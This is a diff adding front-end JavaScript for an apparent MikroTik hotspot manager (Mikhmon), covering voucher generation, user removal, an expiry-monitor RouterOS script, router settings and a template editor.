+  }
+}
+function removeActive(e, t) {
+  if (confirm("Are you sure want to remove user [" + t + "] ?")) {
+    var a = session;
+    "?admin" !== session &&
+      "hotspot" == path &&
+      $.ajax({
+        type: "POST",
+        url: "./post/post_hotspot_remove.php",
+        data: { sessname: a, where: "active_", id: e },
+        dataType: "json",
+        success: function (e) {
+          "success" == e.message
+            ? (clearInterval(window.auto_hotspot_active), loadHotspotActive())
+            : location.reload();
+        }
+      });
+  }
+}
+function removeHost(e, t) {
+  if (confirm("Are you sure want to remove MAC [" + t + "] ?")) {
+    var a = session;
+    "?admin" !== session &&
+      "hotspot" == path &&
+      $.ajax({
+        type: "POST",
+        url: "./post/post_hotspot_remove.php",
+        data: { sessname: a, where: "host_", id: e },
+        dataType: "json",
+        success: function (e) {
+          "success" == e.message
+            ? (clearInterval(window.auto_hotspot_hosts), loadHotspotHosts())
+            : location.reload();
+        }
+      });
+  }
+}
+function setExpMon() {
+  var e = session;
+  "?admin" !== session &&
+    $.ajax({
+      type: "POST",
+      url: "./post/post_expire_monitor.php",
+      data: {
+        sessname: e,
+        expmon:
+          ':local dateint do={:local montharray ( "jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec" );:local days [ :pick $d 4 6 ];:local month [ :pick $d 0 3 ];:local year [ :pick $d 7 11 ];:local monthint ([ :find $montharray $month]);:local month ($monthint + 1);:if ( [len $month] = 1) do={:local zero ("0");:return [:tonum ("$year$zero$month$days")];} else={:return [:tonum ("$year$month$days")];}};:local timeint do={:local hours [ :pick $t 0 2 ];:local minutes [ :pick $t 3 5 ];:return ($hours * 60 + $minutes) ;};:local date [ /system clock get date ];:local time [ /system clock get time ];:local today [$dateint d=$date] ;:local curtime [$timeint t=$time] ;:local tyear [ :pick $date 7 11 ];:local lyear ($tyear-1);:foreach i in [ /ip hotspot user find where comment~"/$tyear" || comment~"/$lyear" ] do={:local comment [ /ip hotspot user get $i comment]; :local limit [ /ip hotspot user get $i limit-uptime]; :local name [ /ip hotspot user get $i name]; :local gettime [:pic $comment 12 20];:if ([:pic $comment 3] = "/" and [:pic $comment 6] = "/") do={:local expd [$dateint d=$comment] ;:local expt [$timeint t=$gettime] ;:if (($expd < $today and $expt < $curtime) or ($expd < $today and $expt > $curtime) or ($expd = $today and $expt < $curtime) and $limit != "00:00:01") do={ :if ([:pic $comment 21] = "N") do={[ /ip hotspot user set limit-uptime=1s $i ];[ /ip hotspot active remove [find where user=$name] ];} else={[ /ip hotspot user remove $i ];[ /ip hotspot active remove [find where user=$name] ];}}}}}'
+      },
+      dataType: "json",
+      success: function (e) {
+        "success" == e.message &&
+          ($("#exp_mon").html(
+            '<i class="fa fa-ci fa-circle text-green" title="Expire users monitor is activated."></i>'
+          ),
+          $("#btn-exp-mon").fadeOut(200));
+      }
+    });
+}
+function setCharacter() {
+  "up" == $("#gen_usrmode").val()
+    ? ($("#lower").removeClass("hide"),
+      $("#upper").removeClass("hide"),
+      $("#upplow").removeClass("hide"),
+      $("#mix").removeClass("hide"),
+      $("#mix1").removeClass("hide"),
+      $("#mix2").removeClass("hide"),
+      $("#upper1").addClass("hide"),
+      $("#lower1").addClass("hide"),
+      $("#upplow1").addClass("hide"),
+      $("#num").addClass("hide"),
+      $("#gen_char").val($("#gen_char option:first").val()),
+      $("#gen_namelength").val("4"))
+    : "vc" == $("#gen_usrmode").val() &&
+      ($("#lower").addClass("hide"),
+      $("#upper").addClass("hide"),
+      $("#upplow").addClass("hide"),
+      $("#mix").removeClass("hide"),
+      $("#mix1").removeClass("hide"),
+      $("#mix2").removeClass("hide"),
+      $("#upper1").removeClass("hide"),
+      $("#lower1").removeClass("hide"),
+      $("#upplow1").removeClass("hide"),
+      $("#num").removeClass("hide"),
+      $("#gen_char").val($("#lower1").val()),
+      $("#gen_namelength").val("8"));
+}
+function generateV() {
+  $("#btn-genV").attr("onclick", ""),
+    localStorage.setItem(session + "_gencode", randomN(101, 999));
+  var e = $("#gen_usrqty").val();
+  localStorage.setItem(session + "_totgenv", e),
+    localStorage.setItem(session + "_genleft", e),
+    genVoucher();
+}
+function genVoucher() {
+  $(".picon").html("<i class='fa fa-circle-o-notch fa-spin text-yellow'></i>"),
+    $(".pprocess").html("Generating...");
+  var e = localStorage.getItem(session + "_genleft");
+  qty = e > 50 ? 50 : e;
+  var t = session;
+  "?admin" !== session &&
+    $.ajax({
+      type: "POST",
+      url: "./post/post_generate_voucher.php",
+      data: {
+        sessname: t,
+        qty: qty,
+        server: $("#gen_hserver").val(),
+        user: $("#gen_usrmode").val(),
+        userl: $("#gen_namelength").val(),
+        prefix: $("#gen_usrprefix").val(),
+        char: $("#gen_char").val(),
+        profile: $("#gen_usrprofile").val(),
+        timelimit: $("#gen_tlimit").val(),
+        datalimit: $("#gen_dlimit").val(),
+        gcomment: $("#gen_usrcomm").val(),
+        gencode: localStorage.getItem(session + "_gencode")
+      },
+      dataType: "json",
+      success: function (e) {
+        if ("success" == e.message) {
+          $(".picon").html(
+            "<i class='fa fa-circle-o-notch fa-spin text-green'></i>"
+          ),
+            $(".pgen").html(e.data.count + " of " + $("#gen_usrqty").val()),
+            $(".pprocess").html("");
+          var a =
+            localStorage.getItem(session + "_totgenv") - Number(e.data.count);
+          localStorage.setItem(session + "_genleft", a),
+            localStorage.setItem(session + "_gencomment", e.data.comment),
+            a > 0
+              ? setTimeout(() => {
+                  genVoucher();
+                }, 1e3)
+              : (genCacheVoucher(),
+                $("#genact-btn").removeClass("hide"),
+                localStorage.setItem(session + "_gencode", ""),
+                $("#btn-genV").css("display", "none"),
+                $(".picon").html("<i class='fa fa-circle text-green'></i>"),
+                $(".pgen").html(e.data.count),
+                $(".pprocess").html("Done"),
+                cacheUser(t, e.data.profile));
+        } else
+          $(".picon").html("<i class='fa fa-circle text-red'></i>"),
+            $(".pprocess").html(e.data.error),
+            setTimeout(function () {
+              $("#gen_usrmsg").html(
+                '<span class="picon"></span> <span class="pgen"></span> <span class="pprocess"></span>&nbsp;'
+              );
+            }, 3e3);
+      }
+    });
+}
+function cacheUser(e, t) {
+  $.get(e + "/users/&prof=" + t + "&f=true").always(function () {
+    loadUsersPPF();
+  });
+}
+function genCacheVoucher() {
+  var e = session;
+  "?admin" !== session &&
+    $.ajax({
+      type: "POST",
+      url: "./post/post_cache_voucher.php",
+      data: {
+        sessname: e,
+        qty: $("#gen_usrqty").val(),
+        user: $("#gen_usrmode").val(),
+        gcomment: $("#gen_usrcomm").val(),
+        gencode: localStorage.getItem(session + "_gencode")
+      },
+      dataType: "json",
+      success: function (e) {
+        "success" == e.message
+          ? console.log(e.data.count)
+          : console.log(e.data.error);
+      }
+    });
+}
+function editRouter(e) {
+  location.href = "./?admin/settings/&r=" + e;
+}
+function getInterval() {
+  return localStorage.getItem(session + "_auto_traffic");
+}
+function fileUpChk(e) {
+  "png" !== e.files[0].name.split(".").pop()
+    ? alert("Please choose .png file type.")
+    : e.files[0].size / 1024 / 1024 > 1
+    ? alert("File to large [" + formatBytes(e.files[0].size) + "], max 1 MiB.")
+    : $("#tempfileup").html(
+        e.files[0].name + " [" + formatBytes(e.files[0].size) + "]"
+      );
+}
+$("#month").change(function () {
+  $("#btnFilter").attr(
+    "title",
+    "Filter " + $("#month").val().capitalize() + " " + $("#year").val()
+  );
+}),
+  $("#year").change(function () {
+    $("#btnFilter").attr(
+      "title",
+      "Filter " + $("#month").val().capitalize() + " " + $("#year").val()
+    );
+  }),
+  $("#logOut").click(function () {
+    $.ajax({
+      type: "POST",
+      url: "./post/post_logout.php",
+      data: { logout: session },
+      success: function (e) {
+        session === e &&
+          (localStorage.setItem("typeTemplate", ""),
+          localStorage.setItem(session + "_cache_user_profiles", ""),
+          location.replace("./?login"));
+      }
+    });
+  }),
+  $("#btn-add-router").click(function () {
+    $("#add-router-message").html("Creating a new config..."),
+      $("#add-router-message").fadeIn(200);
+    "?admin" == session &&
+      "settings" == path &&
+      $.ajax({
+        type: "POST",
+        url: "./post/post_a_router.php",
+        data: { do: "add", router_: "sess_" },
+        dataType: "json",
+        success: function (e) {
+          "Success" == e.message
+            ? (location.href = "./?admin/settings/&r=" + e.sesname)
+            : ($("#add-router-message").css({ width: "500px" }),
+              $("#add-router-message").html(e.message),
+              $("#add-router-message").fadeIn(200),
+              setTimeout(function () {
+                $("#add-router-message").fadeOut(200);
+              }, 5e3));
+        }
+      });
+  }),
+  $(".asave").keyup(
+    delay(function (e) {
+      "" !== $("#sessName").val().trim() && saveRouter($("#sessName").val());
+    }, 1e3)
+  ),
+  $("#idleTo").change(
+    delay(function (e) {
+      "" !== $("#sessName").val().trim() && saveRouter($("#sessName").val());
+    }, 1e3)
+  ),
+  $("#report").change(
+    delay(function (e) {
+      "" !== $("#sessName").val().trim() && saveRouter($("#sessName").val());
+    }, 1e3)
+  ),
+  $("#sessName").keyup(
+    delay(function (e) {
+      "" !== $("#sessName").val().trim() && $("#saveR").click();
+    }, 1e3)
+  ),
+  $(".adm").keyup(
+    delay(function (e) {
+      $("#btn-asave").click();
+    }, 1e3)
+  ),
+  $("#rConnect").click(function () {
+    connect("ee-mess", $("#sessName").val());
+  }),
+  $("#saveR").click(function () {
+    var e = new URL(window.location).searchParams.get("r");
+    "" !== $("#sessName").val() ? saveRouter(e) : $("#sessName").focus();
+  }),
+  $("#btn-asave").click(function () {
+    $("#a-mess").html('<i class="fa fa-cog fa-spin"></i>'),
+      $("#a-mess").fadeIn(200);
+    "?admin" == session &&
+      "settings" == path &&
+      $.ajax({
+        type: "POST",
+        url: "./post/post_a_router.php",
+        data: {
+          do: "saveAdmin",
+          router_: session,
+          username: blah($("#userAdm").val()),
+          password: blah($("#passAdm").val())
+        },
+        dataType: "json",
+        success: function (e) {
+          "Success" == e.message
+            ? ($("#a-mess").html(
+                "<i class='fa fa-check' aria-hidden='true'></i>"
+              ),
+              setTimeout(function () {
+                $("#a-mess").fadeOut(200);
+              }, 1e3))
+            : ($("#e-mess").html(e.message),
+              $("#e-mess").fadeIn(200),
+              setTimeout(function () {
+                $("#e-mess").fadeOut(200),
+                  $("#a-mess").fadeOut(200),
+                  $("#e-mess").html("");
+              }, 3e3));
+        }
+      });
+  }),
+  $("#btn-mm-admin").click(function () {
+    menuActive("mm-admin"),
+      menuNonActive("router-list"),
+      menuNonActive("edit-router"),
+      isMobile() && $("#pload").html($("#btn-mm-admin").html());
+  }),
+  $("#btn-router-list").click(function () {
+    menuNonActive("mm-admin"),
+      menuNonActive("edit-router"),
+      menuActive("router-list"),
+      isMobile() && $("#pload").html($("#btn-router-list").html());
+  }),
+  $("#btn-edit-router").click(function () {
+    menuNonActive("mm-admin"),
+      menuNonActive("router-list"),
+      menuActive("edit-router"),
+      isMobile() && $("#pload").html($("#btn-edit-router").html());
+  }),
+  $("#btn-general").click(function () {
+    $("#btn-details").removeClass("card-tab-active"),
+      $("#udetails").addClass("hide"),
+      $("#btn-general").addClass("card-tab-active"),
+      $("#ugeneral").removeClass("hide");
+  }),
+  $("#btn-details").click(function () {
+    $("#btn-details").addClass("card-tab-active"),
+      $("#udetails").removeClass("hide"),
+      $("#btn-general").removeClass("card-tab-active"),
+      $("#ugeneral").addClass("hide");
+  }),
+  $("#btn-upgeneral").click(function () {
+    $("#btn-updetails").removeClass("card-tab-active"),
+      $("#updetails").addClass("hide"),
+      $("#btn-upgeneral").addClass("card-tab-active"),
+      $("#upgeneral").removeClass("hide");
+  }),
+  $("#btn-updetails").click(function () {
+    $("#btn-updetails").addClass("card-tab-active"),
+      $("#updetails").removeClass("hide"),
+      $("#btn-upgeneral").removeClass("card-tab-active"),
+      $("#upgeneral").addClass("hide");
+  }),
+  $("#btn-gengeneral").click(function () {
+    $("#btn-gendetails").removeClass("card-tab-active"),
+      $("#gendetails").addClass("hide"),
+      $("#btn-gengeneral").addClass("card-tab-active"),
+      $("#gengeneral").removeClass("hide");
+  }),
+  $("#btn-gendetails").click(function () {
+    $("#btn-gendetails").addClass("card-tab-active"),
+      $("#gendetails").removeClass("hide"),
+      $("#btn-gengeneral").removeClass("card-tab-active"),
+      $("#gengeneral").addClass("hide");
+  }),
+  $(".btn-add-hotspot-users").click(function () {
+    $("#addh_user").fadeIn(), noR(1);
+  }),
+  $(".btn-add-user-profiles").click(function () {
+    getAddrPool(), $("#addh_userprofile").fadeIn(), noR(1);
+  }),
+  $(".btn-gen-hotspot-users").click(function () {
+    getHotspotServer(),
+      getHotspotProfile(),
+      $("#gen_user").fadeIn(),
+      localStorage.setItem(session + "_gencode", ""),
+      noR(1);
+  }),
+  $("#genClose").click(function () {
+    "" !== localStorage.getItem(session + "_gencode")
+      ? noR(1)
+      : "" == localStorage.getItem(session + "_gencode") &&
+        ($("#gen_user").fadeOut(), genClose(), noR(0));
+  }),
+  $("#huClose").click(function () {
+    $("#addh_user").fadeOut(),
+      setTimeout(function () {
+        $("#btn-general").click(),
+          $("#add_hserver").val($("#add_hserver option:first").val()),
+          $("#add_usrid").val("0"),
+          $("#add_usrname").val(""),
+          $("#add_usrpass").val(""),
+          $("#add_usrprofile").val($("#add_usrprofile option:first").val()),
+          $("#add_usrmac").val(""),
+          $("#add_tlimit").val(""),
+          $("#add_dlimit").val(""),
+          $("#add_usrcomm").val(""),
+          $("#uuptime").val(""),
+          $("#ubytesin").val(""),
+          $("#ubytesout").val(""),
+          $("#ulimituptime").val(""),
+          $("#ulimitbytestotal").val(""),
+          $("#usrexp").val(""),
+          $("#ucode").val(""),
+          $("#usract-btn").hide(),
+          $("#usrtt").html(
+            '<i class="fa fa-user-plus"></i>&nbsp; <b>Add User</b> &nbsp;'
+          );
+      }, 700),
+      noR(0);
+  }),
+  $("#hupClose").click(function () {
+    $("#addh_userprofile").fadeOut(),
+      setTimeout(function () {
+        $("#btn-upgeneral").click(),
+          $("#add_usrprofid").val("0"),
+          $("#add_usrprofname").val(""),
+          $("#add_adrpool").val($("#add_addrpool option:first").val()),
+          $("#add_sharedusr").val("1"),
+          $("#add_ratelimit").val(""),
+          $("#add_expmode").val($("#add_expmode option:first").val()),
+          $("#add_validity").val(""),
+          $("#add_price").val(""),
+          $("#add_sellingprice").val(""),
+          $("#add_lockuser").val($("#add_lockuser option:first").val()),
+          $("#add_parentqueue").val($("#add_parentqueue option:first").val()),
+          $("#usrprofact-btn").hide(),
+          $("#usrproftt").html(
+            '<i class="fa fa-pie-chart"></i>&nbsp; <b>Add Profile</b> &nbsp;'
+          );
+      }, 700),
+      noR(0);
+  }),
+  $("#add_usrprofname").keypress(function (e) {
+    var t = e.which;
+    return (
+      32 == t ||
+      (48 <= t && t <= 57) ||
+      (65 <= t && t <= 90) ||
+      (97 <= t && t <= 122)
+    );
+  }),
+  $("#gen_usrcomm").keypress(function (e) {
+    var t = e.which;
+    return (
+      32 == t ||
+      (48 <= t && t <= 57) ||
+      (65 <= t && t <= 90) ||
+      (97 <= t && t <= 122)
+    );
+  }),
+  $("#gen_usrmode").change(function () {
+    setCharacter();
+  }),
+  $(".gen_clear").click(function () {
+    genClose();
+  }),
+  $(".print_v").click(function () {
+    pVcr(localStorage.getItem(session + "_gencomment"), "d");
+  }),
+  $(".print_vs").click(function () {
+    pVcr(localStorage.getItem(session + "_gencomment"), "s");
+  }),
+  $("#browsefile").click(function () {
+    $("#fileup").click();
+  });
+var sq = location.hostname.split(".");
+if ("?admin" == session && "template_editor" == path) {
+  var editor = CodeMirror.fromTextArea(
+    document.getElementById("editorMikhmon"),
+    {
+      lineNumbers: !0,
+      matchBrackets: !0,
+      mode: "application/x-httpd-php",
+      indentUnit: 4,
+      indentWithTabs: !0,
+      lineWrapping: !0,
+      viewportMargin: 1 / 0,
+      matchTags: { bothTags: !0 },
+      autoCloseBrackets: !0,
+      autoCloseTags: !0,
+      keyMap: "sublime",
+      extraKeys: { "Ctrl-J": "toMatchingTag" }
+    }
+  );
+  editor.setOption("theme", "material"), editor.refresh();
+}
+function loadTemplate(e) {
+  $(
+    "#select-template option[value=" +
+      localStorage.getItem("nameTemplate") +
+      "]"
+  ).attr("selected", "selected"),
+    localStorage.setItem("typeTemplate", e),
+    localStorage.setItem("nameTemplate", $("#select-template").val());
+  var t = localStorage.getItem("typeTemplate"),
+    a = localStorage.getItem("nameTemplate");
+  localStorage.setItem("tmplPath", t + "." + a + ".txt"),
+    $.get(
+      "./template/" + t + "." + a + ".txt?" + new Date().getTime(),
+      function (e) {
+        editor.setValue(e), editor.refresh();
+      }
+    ).always(function () {
+      "header" == e
+        ? $("#active-edit").html("/template/" + a + "." + t + ".txt")
+        : "row" == e
+        ? $("#active-edit").html("/template/" + a + "." + t + ".txt")
+        : "footer" == e &&
+          $("#active-edit").html("/template/" + a + "." + t + ".txt"),
+        $("#select-template").addClass("btn-group-active");
+    });
+}
+function mNav() {
+  var e = document.getElementById("mnav");
+  "navbar" === e.className
+    ? ((e.className += " nav_responsive"),
+      $("#mactive").hide(),
+      $("#Mtheme").removeClass("hide"))
+    : ((e.className = "navbar"),
+      $("#mactive").show(),
+      $("#Mtheme").addClass("hide"));
+}
+function hidemNav() {
+  (document.getElementById("mnav").className = "navbar"),
+    $("#mactive").show(),
+    $("#Mtheme").addClass("hide");
+}
+function dropD() {
+  $("#mDropdown").hasClass("show")
+    ? $("#mDropdown").removeClass("show")
+    : $("#mDropdown").addClass("show");
+}
+$("#btn-tsave").click(function () {
+  $("#loading").html('<i class="fa fa-cog fa-spin"></i>'),
+    $("#loading").fadeIn(200);
+  var e = localStorage.getItem("tmplPath");
+  "?admin" == session &&
+    "template_editor" == path &&
+    $.ajax({
+      type: "POST",
+      url: "./post/post_template.php",
+      data: {
+        do: "saveTemplate",
+        router_: session,
+        file_: e,
+        _template: editor.getValue()
+      },
+      dataType: "json",
+      success: function (e) {
+        "Saved" == e.message
+          ? ($("#loading").html(
+              " <i class='fa fa-check' aria-hidden='true'></i>"
+            ),
+            setTimeout(function () {
+              $("#loading").fadeOut(200), $("#loading").html("&nbsp;");
+            }, 1e3))
+          : $("#t_err").notify(e.message, "error");
+      }
+    });
+}),
+  $("#select-template").change(function () {
+    loadTemplate("row", this.value);
+  }),
+  isMobile() &&
+    $(document).click() &&
+    $("#mDropdown a").click(function () {
+      $("#mDropdown").removeClass("show");
+    }),
+  $("#sessionslk").click(function (e) {
+    e.stopPropagation();
+  }),
+  $("#lsession").click(function (e) {
+    e.stopPropagation();
+  }),
+  isMobile() &&
+    $(document).click(function () {
+      hidemNav(), $("#mDropdown").removeClass("show");
+    }),
+  $(".mNavBtn").click(function (e) {
+    e.stopPropagation(), mNav(), $("#mDropdown").removeClass("show");
+  }),
+  $(".dropbtn").click(function (e) {
+    e.stopPropagation(), dropD(), hidemNav();
+  }),
+  $("#add_expmode").change(function () {
+    0 == $("#add_expmode").val()
+      ? $("#trvalidity").addClass("hide")
+      : ($("#trvalidity").removeClass("hide"), $("#add_validity").focus());
+  }),
+  $("#hTimeLimit").click(function () {
+    $("#hTimeLimit").notify(
+      "format: d,h,m or s\nexample:\n1d (1 day)\n1h (2 hour)\n10m (10 minutes)\n30s (30 seconds)",
+      "info"
+    );
+  }),
+  $("#hDataLimit").click(function () {
+    $("#hDataLimit").notify(
+      "format: M or G\nexample:\n5G (5 GiB) \n1500M (1500 MiB)\n 1MiB = 1024KiB",
+      "info"
+    );
+  }),
+  $("#ghTimeLimit").click(function () {
+    $("#ghTimeLimit").notify(
+      "format: d,h,m or s\nexample:\n1d (1 day)\n1h (2 hour)\n10m (10 minutes)\n30s (30 seconds)",
+      "info"
+    );
+  }),
+  $("#ghDataLimit").click(function () {
+    $("#ghDataLimit").notify(
+      "format: M or G\nexample:\n5G (5 GiB) \n1500M (1500 MiB)\n 1MiB = 1024KiB",
+      "info"
+    );
+  }),
+  $("#hRateLimit").click(function () {
+    $("#trratelimit").notify("example: 512k/1M", "info");
+  }),
+  $("#hExpMode").click(function () {
+    $("#trexpmode").notify(
+      "None: User without expiry time.\nRemove: User will be deleted after expiry time.\nNotice: user can't login after time expired\nand get notification after trying to login again.\nRecord: Record user data after login.",
+      { className: "info", autoHide: !1 }
+    );
+  }),
+  $("#hValidity").click(function () {
+    $("#trvalidity").notify(
+      "format: d or w\nexample:\n1d (1 day), 30d (30 days)\n1w (7 days)",
+      "info"
+    );
+  }),
+  $("#hLockUser").click(function () {
+    $("#trlockuser").notify(
+      "Lock the MAC Address of user after login.",
+      "info"
+    );
+  }),
+  $("#hLockServer").click(function () {
+    $("#trlockuser").notify(
+      "Lock the Server Hotspot of user after login.",
+      "info"
+    );
+  }),
+  $(".editor_help").click(function () {
+    window.open("https://laksa19.github.io/?mikhmon/v4/voucher");
+  });
+
+
+
